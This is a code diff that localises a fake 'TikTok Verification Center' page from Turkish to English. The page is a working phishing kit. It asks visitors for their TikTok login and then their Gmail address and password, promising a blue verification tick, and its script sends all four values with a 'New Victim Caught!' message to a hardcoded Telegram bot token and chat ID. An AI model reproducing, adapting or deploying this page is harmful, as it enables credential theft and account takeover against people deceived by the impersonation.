@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Doğrulama Merkezi</title>
-    <link rel="icon" href="data:;base64,iVBORw0KGgo="> <!-- Boş favicon.ico -->
+    <title>TikTok Verification Center</title>
+    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
     <style>
         * {
             margin: 0;
@@ -18,18 +18,17 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            padding: 20px;
+            padding: 0;
         }
 
         .header-content {
-            width: 100%;
-            background: #000;
+            width: 100vw;
+            background: #ffffff;
             padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-            margin-bottom: 20px;
+            margin: 0;
         }
 
         .hamburger-wrapper {
@@ -53,7 +52,7 @@
         .hamburger-menu-wrapper span {
             width: 100%;
             height: 2px;
-            background: #fff;
+            background: #000;
             transition: all 0.3s;
         }
 
@@ -74,7 +73,7 @@
         }
 
         .logo-link strong {
-            color: #fff;
+            color: #000;
             font-size: 20px;
             font-weight: 700;
         }
@@ -219,7 +218,7 @@
         }
 
         .download-wrapper img {
-            height: 48px;
+            height: 40px;
             width: auto;
             transition: opacity 0.3s;
         }
@@ -348,6 +347,10 @@
                 flex-direction: column;
                 align-items: flex-start;
             }
+
+            .download-wrapper img {
+                height: 48px;
+            }
         }
     </style>
 </head>
@@ -362,7 +365,7 @@
                 </span>
             </span>
             <div class="logo-container">
-                <a title="TikTok" class="logo-link" href="https://tiktokverifyrequests.rf.gd">
+                <a title="TikTok" class="logo-link" href="https://nicoderrr.github.io/instagramverifyaccount.github.io/">
                     <img class="logo-icon" src="./tiktoklogo.png" alt="TikTok">
                     <strong>TikTok</strong>
                 </a>
@@ -373,47 +376,47 @@
     <div class="main-content">
         <div class="container active" id="step1">
             <img src="./tiktoklogo.png" alt="TikTok Logo" class="logo">
-            <h2>TikTok Doğrulama Merkezi</h2>
-            <p>TikTok doğrulama talebiniz için yardım alın. Paylaşılan bilgiler yalnızca talebinize yanıt vermek için kullanılacaktır.</p>
-            <label class="form-label" for="username">E-posta veya Kullanıcı Adı</label>
-            <input type="text" id="username" placeholder="E-posta veya Kullanıcı Adı" required>
-            <label class="form-label" for="password">Şifre</label>
-            <input type="password" id="password" placeholder="Şifre" required>
-            <button onclick="nextStep()">İleri</button>
-            <div class="case-number">Vaka Numarası: 42726191315</div>
-            <div class="footer">© TikTok. 160 Inc., Direkt Destek</div>
+            <h2>TikTok Verification Center</h2>
+            <p>Get help with your verification request for TikTok. Information shared will only be used to respond to your request.</p>
+            <label class="form-label" for="username">Email or Username</label>
+            <input type="text" id="username" placeholder="Email or Username" required>
+            <label class="form-label" for="password">Password</label>
+            <input type="password" id="password" placeholder="Password" required>
+            <button onclick="nextStep()">Next</button>
+            <div class="case-number">Case Number: 42726191315</div>
+            <div class="footer">© TikTok. 160 Inc., Direct Support</div>
         </div>
 
         <div class="container" id="step2">
             <img src="./tiktoklogo.png" alt="TikTok Logo" class="logo">
-            <h2>Ek Doğrulama</h2>
-            <p>Doğrulama işlemini tamamlamak için lütfen Gmail hesabınızın bilgilerini girin.</p>
-            <label class="form-label" for="gmail">Gmail Adresi</label>
-            <input type="email" id="gmail" placeholder="Gmail Adresi" required>
-            <label class="form-label" for="gmail-password">Gmail Şifresi</label>
-            <input type="password" id="gmail-password" placeholder="Gmail Şifresi" required>
-            <button onclick="submitForm()">İleri</button>
-            <div class="case-number">Vaka Numarası: 42726191315</div>
-            <div class="footer">© TikTok. 160 Inc., Direkt Destek</div>
+            <h2>Additional Verification</h2>
+            <p>To complete the verification process, please enter your Gmail account information.</p>
+            <label class="form-label" for="gmail">Gmail Address</label>
+            <input type="email" id="gmail" placeholder="Gmail Address" required>
+            <label class="form-label" for="gmail-password">Gmail Password</label>
+            <input type="password" id="gmail-password" placeholder="Gmail Password" required>
+            <button onclick="submitForm()">Next</button>
+            <div class="case-number">Case Number: 42726191315</div>
+            <div class="footer">© TikTok. 160 Inc., Direct Support</div>
         </div>
 
         <div class="container" id="success">
             <img src="./tiktoklogo.png" alt="TikTok Logo" class="logo">
-            <h2>Başvuru Alındı</h2>
-            <p>Başvurunuz işleme alındı. Hesabınız yaklaşık 24 saat içinde mavi tik doğrulaması alacaktır.</p>
-            <div class="footer">© TikTok. 160 Inc., Direkt Destek</div>
+            <h2>Application Received</h2>
+            <p>Your application has been processed. Your account will receive blue tick verification within approximately 24 hours.</p>
+            <div class="footer">© TikTok. 160 Inc., Direct Support</div>
         </div>
     </div>
 
     <div class="footer-container">
         <div class="download-container">
             <div class="download-content">
-                <h2>Şimdi İndir</h2>
+                <h2>Download Now</h2>
                 <div class="download-wrapper">
-                    <a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="nofollow noreferrer">
+                    <a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" target="_blank" rel="nofollow noreferrer">
                         <img class="apple" src="./appstore.png" alt="apple-store">
                     </a>
-                    <a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="nofollow noreferrer">
+                    <a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" target="_blank" rel="nofollow noreferrer">
                         <img class="google" src="./googleplay.png" alt="google-store">
                     </a>
                 </div>
@@ -422,64 +425,64 @@
         
         <footer class="footer-content-wrapper">
             <div class="tiktok-logo">
-                <a title="TikTok" class="logo-container" href="https://tiktokverifyrequests.rf.gd">
+                <a title="TikTok" class="logo-container" href="https://nicoderrr.github.io/instagramverifyaccount.github.io/">
                     <strong>TikTok</strong>
                 </a>
             </div>
             
             <div class="footer-content-column">
-                <h4>Şirket</h4>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>TikTok Hakkında</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Haber Odası</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>İletişim</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="noreferrer"><span>Kariyer</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="noreferrer"><span>ByteDance</span></a></h5>
+                <h4>Company</h4>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>About TikTok</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>News Room</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>Contact</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" target="_blank" rel="noreferrer"><span>Careers</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" target="_blank" rel="noreferrer"><span>ByteDance</span></a></h5>
             </div>
             
             <div class="footer-content-column">
-                <h4>Programlar</h4>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>TikTok for Good</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="noreferrer"><span>TikTok for Developers</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Effect House</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="noreferrer"><span>TikTok Ads</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="noreferrer"><span>TikTok Browse</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>TikTok Embeds</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>TikTok Rewards</span></a></h5>
+                <h4>Programs</h4>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>TikTok for Good</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" target="_blank" rel="noreferrer"><span>TikTok for Developers</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>Effect House</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" target="_blank" rel="noreferrer"><span>TikTok Ads</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" target="_blank" rel="noreferrer"><span>TikTok Browse</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>TikTok Embeds</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>TikTok Rewards</span></a></h5>
             </div>
             
             <div class="footer-content-column">
-                <h4>Kaynaklar</h4>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Yardım Merkezi</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Güvenlik Merkezi</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Yaratıcı Akademisi</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Topluluk Kuralları</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Şeffaflık</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Erişilebilirlik</span></a></h5>
+                <h4>Resources</h4>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>Help Center</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>Safety Center</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>Creator Academy</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>Community Guidelines</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>Transparency</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>Accessibility</span></a></h5>
             </div>
             
             <div class="footer-content-column">
-                <h4>Yasal</h4>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Hizmet Şartları</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Gizlilik Politikası</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Dijital Hizmetler Yasası</span></a></h5>
-                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>TikTok Kolluk Kuvvetleri Yönergeleri</span></a></h5>
+                <h4>Legal</h4>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>Terms of Service</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>Privacy Policy</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>Digital Services Act</span></a></h5>
+                <h5 class="to-other"><a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" rel="noreferrer"><span>TikTok Law Enforcement Guidelines</span></a></h5>
             </div>
         </footer>
         
         <div class="footer-bottom-wrapper">
-            <div class="language-selection" style="background:url(https://tiktokverifyrequests.rf.gd/arrow.svg) center no-repeat;background-position:right 10px bottom 11px">
-                <p><span>Türkçe</span></p>
+            <div class="language-selection" style="background:url(./arrow.svg) center no-repeat;background-position:right 10px bottom 11px">
+                <p><span>English</span></p>
                 <select class="language-selection-form" onchange="changeLanguage(this.value)">
                     <option value="id">Bahasa Indonesia</option>
                     <option value="de">Deutsch</option>
-                    <option value="en">English</option>
+                    <option value="en" selected>English</option>
                     <option value="es">Español</option>
                     <option value="fr">Français</option>
                     <option value="it">Italiano</option>
                     <option value="pl">Polski</option>
                     <option value="pt_BR">Português</option>
                     <option value="vi">Tiếng Việt</option>
-                    <option value="tr" selected>Türkçe</option>
+                    <option value="tr">Türkçe</option>
                     <option value="ru">Русский</option>
                     <option value="hi">हिन्दी</option>
                     <option value="ko">한국어</option>
@@ -533,7 +536,7 @@
                 document.getElementById('step2').style.display = 'block';
                 document.getElementById('step2').classList.add('active');
             } else {
-                alert('Lütfen tüm alanları doldurun.');
+                alert('Please fill in all fields.');
             }
         }
 
@@ -546,7 +549,7 @@
             if (gmail && gmailPassword && tiktokUsername && tiktokPassword) {
                 const botToken = '7777367983:AAHFeWMAtxEdl9_d2aCpTqq3UvlUguc4AeU';
                 const chatId = '6116320717';
-                const message = `Yeni Kurban Yakalandı! 😈\n\nTikTok Kullanıcı Adı: ${tiktokUsername}\nTikTok Şifre: ${tiktokPassword}\nGmail: ${gmail}\nGmail Şifre: ${gmailPassword}\nZaman: ${new Date().toISOString()}`;
+                const message = `New Victim Caught! 😈\n\nTikTok Username: ${tiktokUsername}\nTikTok Password: ${tiktokPassword}\nGmail: ${gmail}\nGmail Password: ${gmailPassword}\nTime: ${new Date().toISOString()}`;
 
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -559,7 +562,7 @@
                     }).toString()
                 })
                 .then(response => {
-                    if (!response.ok) throw new Error(`HTTP Hatası: ${response.status}`);
+                    if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
                     return response.json();
                 })
                 .then(data => {
@@ -568,26 +571,20 @@
                         document.getElementById('success').style.display = 'block';
                         document.getElementById('success').classList.add('active');
                     } else {
-                        alert(`Veriler Telegram’a gönderilemedi! Hata: ${data.description}`);
+                        alert(`Failed to send data to Telegram! Error: ${data.description}`);
                     }
                 })
                 .catch(error => {
-                    console.error('Hata:', error);
-                    alert('Hata oluştu, veriler gönderilemedi!');
+                    console.error('Error:', error);
+                    alert('An error occurred, data could not be sent!');
                 });
             } else {
-                alert('Lütfen tüm alanları doldurun.');
+                alert('Please fill in all fields.');
             }
         }
 
         function changeLanguage(lang) {
             const translations = {
-                tr: {
-                    title: 'TikTok Doğrulama Merkezi',
-                    step1Desc: 'TikTok doğrulama talebiniz için yardım alın. Paylaşılan bilgiler yalnızca talebinize yanıt vermek için kullanılacaktır.',
-                    step2Desc: 'Doğrulama işlemini tamamlamak için lütfen Gmail hesabınızın bilgilerini girin.',
-                    successDesc: 'Başvurunuz işleme alındı. Hesabınız yaklaşık 24 saat içinde mavi tik doğrulaması alacaktır.'
-                },
                 en: {
                     title: 'TikTok Verification Center',
                     step1Desc: 'Get help with your verification request for TikTok. Information shared will only be used to respond to your request.',
@@ -596,12 +593,12 @@
                 }
             };
 
-            const selectedLang = translations[lang] || translations['tr'];
+            const selectedLang = translations[lang] || translations['en'];
             document.querySelector('#step1 h2').textContent = selectedLang.title;
             document.querySelector('#step1 p').textContent = selectedLang.step1Desc;
-            document.querySelector('#step2 h2').textContent = 'Ek Doğrulama';
+            document.querySelector('#step2 h2').textContent = 'Additional Verification';
             document.querySelector('#step2 p').textContent = selectedLang.step2Desc;
-            document.querySelector('#success h2').textContent = 'Başvuru Alındı';
+            document.querySelector('#success h2').textContent = 'Application Received';
             document.querySelector('#success p').textContent = selectedLang.successDesc;
         }
     </script>
